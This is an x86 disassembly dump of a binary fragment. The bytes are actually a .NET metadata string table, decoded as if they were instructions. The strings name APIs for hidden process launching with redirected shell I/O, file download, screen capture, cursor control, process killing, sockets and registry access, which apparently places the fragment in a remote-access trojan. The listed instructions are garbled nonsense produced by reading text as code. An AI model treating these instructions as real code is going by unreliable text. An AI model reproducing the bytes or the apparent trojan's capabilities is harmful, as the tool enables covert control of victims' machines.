  409206:	52                   	push   %edx
  409207:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40920b:	76 65                	jbe    0x409272
  40920d:	64 00 61 64          	add    %ah,%fs:0x64(%ecx)
  409211:	64 5f                	fs pop %edi
  409213:	45                   	inc    %ebp
  409214:	72 72                	jb     0x409288
  409216:	6f                   	outsl  %ds:(%esi),(%dx)
  409217:	72 44                	jb     0x40925d
  409219:	61                   	popa
  40921a:	74 61                	je     0x40927d
  40921c:	52                   	push   %edx
  40921d:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409221:	76 65                	jbe    0x409288
  409223:	64 00 4f 70          	add    %cl,%fs:0x70(%edi)
  409227:	65 72 61             	gs jb  0x40928b
  40922a:	74 6f                	je     0x40929b
  40922c:	72 73                	jb     0x4092a1
  40922e:	00 41 64             	add    %al,0x64(%ecx)
  409231:	64 4f                	fs dec %edi
  409233:	62 6a 65             	bound  %ebp,0x65(%edx)
  409236:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  40923a:	65 74 5f             	gs je  0x40929c
  40923d:	44                   	inc    %esp
  40923e:	61                   	popa
  40923f:	74 61                	je     0x4092a2
  409241:	00 53 79             	add    %dl,0x79(%ebx)
  409244:	73 74                	jae    0x4092ba
  409246:	65 6d                	gs insl (%dx),%es:(%edi)
  409248:	2e 4e                	cs dec %esi
  40924a:	65 74 00             	gs je  0x40924d
  40924d:	57                   	push   %edi
  40924e:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409252:	69 65 6e 74 00 53 74 	imul   $0x74530074,0x6e(%ebp),%esp
  409259:	72 65                	jb     0x4092c0
  40925b:	61                   	popa
  40925c:	6d                   	insl   (%dx),%es:(%edi)
  40925d:	57                   	push   %edi
  40925e:	72 69                	jb     0x4092c9
  409260:	74 65                	je     0x4092c7
  409262:	72 00                	jb     0x409264
  409264:	42                   	inc    %edx
  409265:	69 74 6d 61 70 00 46 	imul   $0x69460070,0x61(%ebp,%ebp,2),%esi
  40926c:	69 
  40926d:	6c                   	insb   (%dx),%es:(%edi)
  40926e:	65 41                	gs inc %ecx
  409270:	74 74                	je     0x4092e6
  409272:	72 69                	jb     0x4092dd
  409274:	62 75 74             	bound  %esi,0x74(%ebp)
  409277:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40927b:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  40927f:	67 6c                	insb   (%dx),%es:(%di)
  409281:	65 00 50 6f          	add    %dl,%gs:0x6f(%eax)
  409285:	69 6e 74 00 50 72 6f 	imul   $0x6f725000,0x74(%esi),%ebp
  40928c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40928f:	73 53                	jae    0x4092e4
  409291:	74 61                	je     0x4092f4
  409293:	72 74                	jb     0x409309
  409295:	49                   	dec    %ecx
  409296:	6e                   	outsb  %ds:(%esi),(%dx)
  409297:	66 6f                	outsw  %ds:(%esi),(%dx)
  409299:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  40929d:	65 54                	gs push %esp
  40929f:	69 6d 65 00 53 79 73 	imul   $0x73795300,0x65(%ebp),%ebp
  4092a6:	74 65                	je     0x40930d
  4092a8:	6d                   	insl   (%dx),%es:(%edi)
  4092a9:	2e 43                	cs inc %ebx
  4092ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ac:	6c                   	insb   (%dx),%es:(%edi)
  4092ad:	6c                   	insb   (%dx),%es:(%edi)
  4092ae:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b4:	73 00                	jae    0x4092b6
  4092b6:	49                   	dec    %ecx
  4092b7:	45                   	inc    %ebp
  4092b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b9:	75 6d                	jne    0x409328
  4092bb:	65 72 61             	gs jb  0x40931f
  4092be:	74 6f                	je     0x40932f
  4092c0:	72 00                	jb     0x4092c2
  4092c2:	53                   	push   %ebx
  4092c3:	74 72                	je     0x409337
  4092c5:	69 6e 67 73 00 43 6f 	imul   $0x6f430073,0x67(%esi),%ebp
  4092cc:	6d                   	insl   (%dx),%es:(%edi)
  4092cd:	70 61                	jo     0x409330
  4092cf:	72 65                	jb     0x409336
  4092d1:	4d                   	dec    %ebp
  4092d2:	65 74 68             	gs je  0x40933d
  4092d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d6:	64 00 53 70          	add    %dl,%fs:0x70(%ebx)
  4092da:	6c                   	insb   (%dx),%es:(%edi)
  4092db:	69 74 00 43 6f 6d 70 	imul   $0x61706d6f,0x43(%eax,%eax,1),%esi
  4092e2:	61 
  4092e3:	72 65                	jb     0x40934a
  4092e5:	53                   	push   %ebx
  4092e6:	74 72                	je     0x40935a
  4092e8:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4092ef:	74 65                	je     0x409356
  4092f1:	6d                   	insl   (%dx),%es:(%edi)
  4092f2:	2e 57                	cs push %edi
  4092f4:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4092fb:	46                   	inc    %esi
  4092fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fd:	72 6d                	jb     0x40936c
  4092ff:	73 00                	jae    0x409301
  409301:	52                   	push   %edx
  409302:	65 73 74             	gs jae 0x409379
  409305:	61                   	popa
  409306:	72 74                	jb     0x40937c
  409308:	00 53 6f             	add    %dl,0x6f(%ebx)
  40930b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40930e:	74 53                	je     0x409363
  409310:	68 75 74 64 6f       	push   $0x6f647475
  409315:	77 6e                	ja     0x409385
  409317:	00 53 68             	add    %dl,0x68(%ebx)
  40931a:	75 74                	jne    0x409390
  40931c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40931e:	77 6e                	ja     0x40938e
  409320:	00 4e 65             	add    %cl,0x65(%esi)
  409323:	77 4c                	ja     0x409371
  409325:	61                   	popa
  409326:	74 65                	je     0x40938d
  409328:	42                   	inc    %edx
  409329:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  409330:	4c                   	dec    %esp
  409331:	61                   	popa
  409332:	74 65                	je     0x409399
  409334:	43                   	inc    %ebx
  409335:	61                   	popa
  409336:	6c                   	insb   (%dx),%es:(%edi)
  409337:	6c                   	insb   (%dx),%es:(%edi)
  409338:	00 43 68             	add    %al,0x68(%ebx)
  40933b:	61                   	popa
  40933c:	6e                   	outsb  %ds:(%esi),(%dx)
  40933d:	67 65 54             	addr16 gs push %esp
  409340:	79 70                	jns    0x4093b2
  409342:	65 00 53 63          	add    %dl,%gs:0x63(%ebx)
  409346:	72 65                	jb     0x4093ad
  409348:	65 6e                	outsb  %gs:(%esi),(%dx)
  40934a:	00 67 65             	add    %ah,0x65(%edi)
  40934d:	74 5f                	je     0x4093ae
  40934f:	50                   	push   %eax
  409350:	72 69                	jb     0x4093bb
  409352:	6d                   	insl   (%dx),%es:(%edi)
  409353:	61                   	popa
  409354:	72 79                	jb     0x4093cf
  409356:	53                   	push   %ebx
  409357:	63 72 65             	arpl   %esi,0x65(%edx)
  40935a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40935c:	00 67 65             	add    %ah,0x65(%edi)
  40935f:	74 5f                	je     0x4093c0
  409361:	42                   	inc    %edx
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	75 6e                	jne    0x4093d3
  409365:	64 73 00             	fs jae 0x409368
  409368:	67 65 74 5f          	addr16 gs je 0x4093cb
  40936c:	53                   	push   %ebx
  40936d:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  409374:	63 61 74             	arpl   %esp,0x74(%ecx)
  409377:	65 6e                	outsb  %gs:(%esi),(%dx)
  409379:	61                   	popa
  40937a:	74 65                	je     0x4093e1
  40937c:	4f                   	dec    %edi
  40937d:	62 6a 65             	bound  %ebp,0x65(%edx)
  409380:	63 74 00 4c          	arpl   %esi,0x4c(%eax,%eax,1)
  409384:	61                   	popa
  409385:	74 65                	je     0x4093ec
  409387:	47                   	inc    %edi
  409388:	65 74 00             	gs je  0x40938b
  40938b:	43                   	inc    %ebx
  40938c:	75 72                	jne    0x409400
  40938e:	73 6f                	jae    0x4093ff
  409390:	72 00                	jb     0x409392
  409392:	73 65                	jae    0x4093f9
  409394:	74 5f                	je     0x4093f5
  409396:	50                   	push   %eax
  409397:	6f                   	outsl  %ds:(%esi),(%dx)
  409398:	73 69                	jae    0x409403
  40939a:	74 69                	je     0x409405
  40939c:	6f                   	outsl  %ds:(%esi),(%dx)
  40939d:	6e                   	outsb  %ds:(%esi),(%dx)
  40939e:	00 43 6f             	add    %al,0x6f(%ebx)
  4093a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a2:	76 65                	jbe    0x409409
  4093a4:	72 74                	jb     0x40941a
  4093a6:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4093aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ac:	6c                   	insb   (%dx),%es:(%edi)
  4093ad:	65 61                	gs popa
  4093af:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b0:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4093b4:	79 74                	jns    0x40942a
  4093b6:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  4093ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4093bb:	74 50                	je     0x40940d
  4093bd:	74 72                	je     0x409431
  4093bf:	00 5a 65             	add    %bl,0x65(%edx)
  4093c2:	72 6f                	jb     0x409433
  4093c4:	00 47 65             	add    %al,0x65(%edi)
  4093c7:	74 54                	je     0x40941d
  4093c9:	65 6d                	gs insl (%dx),%es:(%edi)
  4093cb:	70 46                	jo     0x409413
  4093cd:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4093d4:	00 
  4093d5:	44                   	inc    %esp
  4093d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d7:	77 6e                	ja     0x409447
  4093d9:	6c                   	insb   (%dx),%es:(%edi)
  4093da:	6f                   	outsl  %ds:(%esi),(%dx)
  4093db:	61                   	popa
  4093dc:	64 46                	fs inc %esi
  4093de:	69 6c 65 00 49 6e 74 	imul   $0x65746e49,0x0(%ebp,%eiz,2),%ebp
  4093e5:	65 
  4093e6:	72 61                	jb     0x409449
  4093e8:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  4093ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ed:	00 43 72             	add    %al,0x72(%ebx)
  4093f0:	65 61                	gs popa
  4093f2:	74 65                	je     0x409459
  4093f4:	4f                   	dec    %edi
  4093f5:	62 6a 65             	bound  %ebp,0x65(%edx)
  4093f8:	63 74 00 49          	arpl   %esi,0x49(%eax,%eax,1)
  4093fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4093fd:	74 33                	je     0x409432
  4093ff:	32 00                	xor    (%eax),%al
  409401:	4c                   	dec    %esp
  409402:	61                   	popa
  409403:	74 65                	je     0x40946a
  409405:	53                   	push   %ebx
  409406:	65 74 00             	gs je  0x409409
  409409:	41                   	inc    %ecx
  40940a:	70 70                	jo     0x40947c
  40940c:	57                   	push   %edi
  40940d:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  409414:	00 53 68             	add    %dl,0x68(%ebx)
  409417:	65 6c                	gs insb (%dx),%es:(%edi)
  409419:	6c                   	insb   (%dx),%es:(%edi)
  40941a:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  40941e:	6e                   	outsb  %ds:(%esi),(%dx)
  40941f:	74 33                	je     0x409454
  409421:	32 00                	xor    (%eax),%al
  409423:	41                   	inc    %ecx
  409424:	62 6f 72             	bound  %ebp,0x72(%edi)
  409427:	74 00                	je     0x409429
  409429:	45                   	inc    %ebp
  40942a:	78 69                	js     0x409495
  40942c:	73 74                	jae    0x4094a2
  40942e:	73 00                	jae    0x409430
  409430:	67 65 74 5f          	addr16 gs je 0x409493
  409434:	53                   	push   %ebx
  409435:	74 61                	je     0x409498
  409437:	72 74                	jb     0x4094ad
  409439:	49                   	dec    %ecx
  40943a:	6e                   	outsb  %ds:(%esi),(%dx)
  40943b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40943d:	00 73 65             	add    %dh,0x65(%ebx)
  409440:	74 5f                	je     0x4094a1
  409442:	46                   	inc    %esi
  409443:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40944a:	00 
  40944b:	73 65                	jae    0x4094b2
  40944d:	74 5f                	je     0x4094ae
  40944f:	41                   	inc    %ecx
  409450:	72 67                	jb     0x4094b9
  409452:	75 6d                	jne    0x4094c1
  409454:	65 6e                	outsb  %gs:(%esi),(%dx)
  409456:	74 73                	je     0x4094cb
  409458:	00 73 65             	add    %dh,0x65(%ebx)
  40945b:	74 5f                	je     0x4094bc
  40945d:	55                   	push   %ebp
  40945e:	73 65                	jae    0x4094c5
  409460:	53                   	push   %ebx
  409461:	68 65 6c 6c 45       	push   $0x456c6c65
  409466:	78 65                	js     0x4094cd
  409468:	63 75 74             	arpl   %esi,0x74(%ebp)
  40946b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40946f:	74 5f                	je     0x4094d0
  409471:	52                   	push   %edx
  409472:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  409479:	53 74 
  40947b:	61                   	popa
  40947c:	6e                   	outsb  %ds:(%esi),(%dx)
  40947d:	64 61                	fs popa
  40947f:	72 64                	jb     0x4094e5
  409481:	45                   	inc    %ebp
  409482:	72 72                	jb     0x4094f6
  409484:	6f                   	outsl  %ds:(%esi),(%dx)
  409485:	72 00                	jb     0x409487
  409487:	73 65                	jae    0x4094ee
  409489:	74 5f                	je     0x4094ea
  40948b:	52                   	push   %edx
  40948c:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  409493:	53 74 
  409495:	61                   	popa
  409496:	6e                   	outsb  %ds:(%esi),(%dx)
  409497:	64 61                	fs popa
  409499:	72 64                	jb     0x4094ff
  40949b:	4f                   	dec    %edi
  40949c:	75 74                	jne    0x409512
  40949e:	70 75                	jo     0x409515
  4094a0:	74 00                	je     0x4094a2
  4094a2:	73 65                	jae    0x409509
  4094a4:	74 5f                	je     0x409505
  4094a6:	43                   	inc    %ebx
  4094a7:	72 65                	jb     0x40950e
  4094a9:	61                   	popa
  4094aa:	74 65                	je     0x409511
  4094ac:	4e                   	dec    %esi
  4094ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ae:	57                   	push   %edi
  4094af:	69 6e 64 6f 77 00 57 	imul   $0x5700776f,0x64(%esi),%ebp
  4094b6:	61                   	popa
  4094b7:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  4094be:	69 
  4094bf:	74 00                	je     0x4094c1
  4094c1:	73 65                	jae    0x409528
  4094c3:	74 5f                	je     0x409524
  4094c5:	52                   	push   %edx
  4094c6:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  4094cd:	53 74 
  4094cf:	61                   	popa
  4094d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094d1:	64 61                	fs popa
  4094d3:	72 64                	jb     0x409539
  4094d5:	49                   	dec    %ecx
  4094d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4094d7:	70 75                	jo     0x40954e
  4094d9:	74 00                	je     0x4094db
  4094db:	67 65 74 5f          	addr16 gs je 0x40953e
  4094df:	49                   	dec    %ecx
  4094e0:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4094e4:	67 69 6e 45 72 72 6f 	imul   $0x726f7272,0x45(%bp),%ebp
  4094eb:	72 
  4094ec:	52                   	push   %edx
  4094ed:	65 61                	gs popa
  4094ef:	64 4c                	fs dec %esp
  4094f1:	69 6e 65 00 42 65 67 	imul   $0x67654200,0x65(%esi),%ebp
  4094f8:	69 6e 4f 75 74 70 75 	imul   $0x75707475,0x4f(%esi),%ebp
  4094ff:	74 52                	je     0x409553
  409501:	65 61                	gs popa
  409503:	64 4c                	fs dec %esp
  409505:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  40950c:	5f                   	pop    %edi
  40950d:	53                   	push   %ebx
  40950e:	74 61                	je     0x409571
  409510:	72 74                	jb     0x409586
  409512:	54                   	push   %esp
  409513:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  40951a:	5f                   	pop    %edi
  40951b:	53                   	push   %ebx
  40951c:	74 61                	je     0x40957f
  40951e:	6e                   	outsb  %ds:(%esi),(%dx)
  40951f:	64 61                	fs popa
  409521:	72 64                	jb     0x409587
  409523:	49                   	dec    %ecx
  409524:	6e                   	outsb  %ds:(%esi),(%dx)
  409525:	70 75                	jo     0x40959c
  409527:	74 00                	je     0x409529
  409529:	54                   	push   %esp
  40952a:	65 78 74             	gs js  0x4095a1
  40952d:	57                   	push   %edi
  40952e:	72 69                	jb     0x409599
  409530:	74 65                	je     0x409597
  409532:	72 00                	jb     0x409534
  409534:	57                   	push   %edi
  409535:	72 69                	jb     0x4095a0
  409537:	74 65                	je     0x40959e
  409539:	4c                   	dec    %esp
  40953a:	69 6e 65 00 46 6c 75 	imul   $0x756c4600,0x65(%esi),%ebp
  409541:	73 68                	jae    0x4095ab
  409543:	00 47 65             	add    %al,0x65(%edi)
  409546:	74 50                	je     0x409598
  409548:	72 6f                	jb     0x4095b9
  40954a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40954d:	73 65                	jae    0x4095b4
  40954f:	73 00                	jae    0x409551
  409551:	67 65 74 5f          	addr16 gs je 0x4095b4
  409555:	50                   	push   %eax
  409556:	72 6f                	jb     0x4095c7
  409558:	63 65 73             	arpl   %esp,0x73(%ebp)
  40955b:	73 4e                	jae    0x4095ab
  40955d:	61                   	popa
  40955e:	6d                   	insl   (%dx),%es:(%edi)
  40955f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409563:	74 46                	je     0x4095ab
  409565:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40956c:	57 
  40956d:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409574:	78 
  409575:	74 65                	je     0x4095dc
  409577:	6e                   	outsb  %ds:(%esi),(%dx)
  409578:	73 69                	jae    0x4095e3
  40957a:	6f                   	outsl  %ds:(%esi),(%dx)
  40957b:	6e                   	outsb  %ds:(%esi),(%dx)
  40957c:	00 47 65             	add    %al,0x65(%edi)
  40957f:	74 45                	je     0x4095c6
  409581:	78 74                	js     0x4095f7
  409583:	65 6e                	outsb  %gs:(%esi),(%dx)
  409585:	73 69                	jae    0x4095f0
  409587:	6f                   	outsl  %ds:(%esi),(%dx)
  409588:	6e                   	outsb  %ds:(%esi),(%dx)
  409589:	00 47 65             	add    %al,0x65(%edi)
  40958c:	74 50                	je     0x4095de
  40958e:	72 6f                	jb     0x4095ff
  409590:	63 65 73             	arpl   %esp,0x73(%ebp)
  409593:	73 42                	jae    0x4095d7
  409595:	79 49                	jns    0x4095e0
  409597:	64 00 4b 69          	add    %cl,%fs:0x69(%ebx)
  40959b:	6c                   	insb   (%dx),%es:(%edi)
  40959c:	6c                   	insb   (%dx),%es:(%edi)
  40959d:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  4095a1:	65 74 65             	gs je  0x409609
  4095a4:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  4095a8:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4095ad:	79 00                	jns    0x4095af
  4095af:	53                   	push   %ebx
  4095b0:	65 72 76             	gs jb  0x409629
  4095b3:	65 72 43             	gs jb  0x4095f9
  4095b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b7:	6d                   	insl   (%dx),%es:(%edi)
  4095b8:	70 75                	jo     0x40962f
  4095ba:	74 65                	je     0x409621
  4095bc:	72 00                	jb     0x4095be
  4095be:	4d                   	dec    %ebp
  4095bf:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4095c6:	74 2e                	je     0x4095f6
  4095c8:	56                   	push   %esi
  4095c9:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4095d0:	73 69                	jae    0x40963b
  4095d2:	63 2e                	arpl   %ebp,(%esi)
  4095d4:	4d                   	dec    %ebp
  4095d5:	79 53                	jns    0x40962a
  4095d7:	65 72 76             	gs jb  0x409650
  4095da:	69 63 65 73 00 46 69 	imul   $0x69460073,0x65(%ebx),%esp
  4095e1:	6c                   	insb   (%dx),%es:(%edi)
  4095e2:	65 53                	gs push %ebx
  4095e4:	79 73                	jns    0x409659
  4095e6:	74 65                	je     0x40964d
  4095e8:	6d                   	insl   (%dx),%es:(%edi)
  4095e9:	50                   	push   %eax
  4095ea:	72 6f                	jb     0x40965b
  4095ec:	78 79                	js     0x409667
  4095ee:	00 67 65             	add    %ah,0x65(%edi)
  4095f1:	74 5f                	je     0x409652
  4095f3:	46                   	inc    %esi
  4095f4:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  4095fb:	65 
  4095fc:	6d                   	insl   (%dx),%es:(%edi)
  4095fd:	00 52 65             	add    %dl,0x65(%edx)
  409600:	6e                   	outsb  %ds:(%esi),(%dx)
  409601:	61                   	popa
  409602:	6d                   	insl   (%dx),%es:(%edi)
  409603:	65 44                	gs inc %esp
  409605:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40960c:	79 00                	jns    0x40960e
  40960e:	52                   	push   %edx
  40960f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409611:	61                   	popa
  409612:	6d                   	insl   (%dx),%es:(%edi)
  409613:	65 46                	gs inc %esi
  409615:	69 6c 65 00 52 65 61 	imul   $0x64616552,0x0(%ebp,%eiz,2),%ebp
  40961c:	64 
  40961d:	41                   	inc    %ecx
  40961e:	6c                   	insb   (%dx),%es:(%edi)
  40961f:	6c                   	insb   (%dx),%es:(%edi)
  409620:	54                   	push   %esp
  409621:	65 78 74             	gs js  0x409698
  409624:	00 49 6d             	add    %cl,0x6d(%ecx)
  409627:	61                   	popa
  409628:	67 65 00 47 65       	add    %al,%gs:0x65(%bx)
  40962d:	74 54                	je     0x409683
  40962f:	68 75 6d 62 6e       	push   $0x6e626d75
  409634:	61                   	popa
  409635:	69 6c 49 6d 61 67 65 	imul   $0x41656761,0x6d(%ecx,%ecx,2),%ebp
  40963c:	41 
  40963d:	62 6f 72             	bound  %ebp,0x72(%edi)
  409640:	74 00                	je     0x409642
  409642:	49                   	dec    %ecx
  409643:	6e                   	outsb  %ds:(%esi),(%dx)
  409644:	74 50                	je     0x409696
  409646:	74 72                	je     0x4096ba
  409648:	00 47 65             	add    %al,0x65(%edi)
  40964b:	74 54                	je     0x4096a1
  40964d:	68 75 6d 62 6e       	push   $0x6e626d75
  409652:	61                   	popa
  409653:	69 6c 49 6d 61 67 65 	imul   $0x656761,0x6d(%ecx,%ecx,2),%ebp
  40965a:	00 
  40965b:	49                   	dec    %ecx
  40965c:	6d                   	insl   (%dx),%es:(%edi)
  40965d:	61                   	popa
  40965e:	67 65 46             	addr16 gs inc %esi
  409661:	6f                   	outsl  %ds:(%esi),(%dx)
  409662:	72 6d                	jb     0x4096d1
  409664:	61                   	popa
  409665:	74 00                	je     0x409667
  409667:	67 65 74 5f          	addr16 gs je 0x4096ca
  40966b:	50                   	push   %eax
  40966c:	6e                   	outsb  %ds:(%esi),(%dx)
  40966d:	67 00 53 61          	add    %dl,0x61(%bp,%di)
  409671:	76 65                	jbe    0x4096d8
  409673:	00 46 69             	add    %al,0x69(%esi)
  409676:	6c                   	insb   (%dx),%es:(%edi)
  409677:	65 53                	gs push %ebx
  409679:	79 73                	jns    0x4096ee
  40967b:	74 65                	je     0x4096e2
  40967d:	6d                   	insl   (%dx),%es:(%edi)
  40967e:	00 53 65             	add    %dl,0x65(%ebx)
  409681:	74 41                	je     0x4096c4
  409683:	74 74                	je     0x4096f9
  409685:	72 00                	jb     0x409687
  409687:	43                   	inc    %ebx
  409688:	72 65                	jb     0x4096ef
  40968a:	61                   	popa
  40968b:	74 65                	je     0x4096f2
  40968d:	44                   	inc    %esp
  40968e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409695:	79 00                	jns    0x409697
  409697:	46                   	inc    %esi
  409698:	69 6c 65 53 74 72 65 	imul   $0x61657274,0x53(%ebp,%eiz,2),%ebp
  40969f:	61 
  4096a0:	6d                   	insl   (%dx),%es:(%edi)
  4096a1:	00 43 72             	add    %al,0x72(%ebx)
  4096a4:	65 61                	gs popa
  4096a6:	74 65                	je     0x40970d
  4096a8:	00 52 65             	add    %dl,0x65(%edx)
  4096ab:	61                   	popa
  4096ac:	64 41                	fs inc %ecx
  4096ae:	6c                   	insb   (%dx),%es:(%edi)
  4096af:	6c                   	insb   (%dx),%es:(%edi)
  4096b0:	42                   	inc    %edx
  4096b1:	79 74                	jns    0x409727
  4096b3:	65 73 00             	gs jae 0x4096b6
  4096b6:	54                   	push   %esp
  4096b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4096b8:	42                   	inc    %edx
  4096b9:	61                   	popa
  4096ba:	73 65                	jae    0x409721
  4096bc:	36 34 53             	ss xor $0x53,%al
  4096bf:	74 72                	je     0x409733
  4096c1:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  4096c8:	74 65                	je     0x40972f
  4096ca:	41                   	inc    %ecx
  4096cb:	6c                   	insb   (%dx),%es:(%edi)
  4096cc:	6c                   	insb   (%dx),%es:(%edi)
  4096cd:	42                   	inc    %edx
  4096ce:	79 74                	jns    0x409744
  4096d0:	65 73 00             	gs jae 0x4096d3
  4096d3:	47                   	inc    %edi
  4096d4:	65 74 54             	gs je  0x40972b
  4096d7:	65 6d                	gs insl (%dx),%es:(%edi)
  4096d9:	70 50                	jo     0x40972b
  4096db:	61                   	popa
  4096dc:	74 68                	je     0x409746
  4096de:	00 43 6f             	add    %al,0x6f(%ebx)
  4096e1:	70 79                	jo     0x40975c
  4096e3:	44                   	inc    %esp
  4096e4:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4096eb:	79 00                	jns    0x4096ed
  4096ed:	4d                   	dec    %ebp
  4096ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ef:	76 65                	jbe    0x409756
  4096f1:	00 4d 6f             	add    %cl,0x6f(%ebp)
  4096f4:	76 65                	jbe    0x40975b
  4096f6:	44                   	inc    %esp
  4096f7:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4096fe:	79 00                	jns    0x409700
  409700:	41                   	inc    %ecx
  409701:	75 64                	jne    0x409767
  409703:	69 6f 00 67 65 74 5f 	imul   $0x5f746567,0x0(%edi),%ebp
  40970a:	41                   	inc    %ecx
  40970b:	75 64                	jne    0x409771
  40970d:	69 6f 00 53 74 6f 70 	imul   $0x706f7453,0x0(%edi),%ebp
  409714:	00 50 6c             	add    %dl,0x6c(%eax)
  409717:	61                   	popa
  409718:	79 00                	jns    0x40971a
  40971a:	4d                   	dec    %ebp
  40971b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409722:	74 2e                	je     0x409752
  409724:	57                   	push   %edi
  409725:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  40972c:	67 69 73 74 72 79 00 	imul   $0x47007972,0x74(%bp,%di),%esi
  409733:	47 
  409734:	65 74 56             	gs je  0x40978d
  409737:	61                   	popa
  409738:	6c                   	insb   (%dx),%es:(%edi)
  409739:	75 65                	jne    0x4097a0
  40973b:	00 49 45             	add    %cl,0x45(%ecx)
  40973e:	6e                   	outsb  %ds:(%esi),(%dx)
  40973f:	75 6d                	jne    0x4097ae
  409741:	65 72 61             	gs jb  0x4097a5
  409744:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  409748:	47                   	inc    %edi
  409749:	65 74 45             	gs je  0x409791
  40974c:	6e                   	outsb  %ds:(%esi),(%dx)
  40974d:	75 6d                	jne    0x4097bc
  40974f:	65 72 61             	gs jb  0x4097b3
  409752:	74 6f                	je     0x4097c3
  409754:	72 00                	jb     0x409756
  409756:	67 65 74 5f          	addr16 gs je 0x4097b9
  40975a:	43                   	inc    %ebx
  40975b:	75 72                	jne    0x4097cf
  40975d:	72 65                	jb     0x4097c4
  40975f:	6e                   	outsb  %ds:(%esi),(%dx)
  409760:	74 00                	je     0x409762
  409762:	4d                   	dec    %ebp
  409763:	6f                   	outsl  %ds:(%esi),(%dx)
  409764:	76 65                	jbe    0x4097cb
  409766:	4e                   	dec    %esi
  409767:	65 78 74             	gs js  0x4097de
  40976a:	00 4e 65             	add    %cl,0x65(%esi)
  40976d:	74 77                	je     0x4097e6
  40976f:	6f                   	outsl  %ds:(%esi),(%dx)
  409770:	72 6b                	jb     0x4097dd
  409772:	00 67 65             	add    %ah,0x65(%edi)
  409775:	74 5f                	je     0x4097d6
  409777:	4e                   	dec    %esi
  409778:	65 74 77             	gs je  0x4097f2
  40977b:	6f                   	outsl  %ds:(%esi),(%dx)
  40977c:	72 6b                	jb     0x4097e9
  40977e:	00 4d 65             	add    %cl,0x65(%ebp)
  409781:	73 73                	jae    0x4097f6
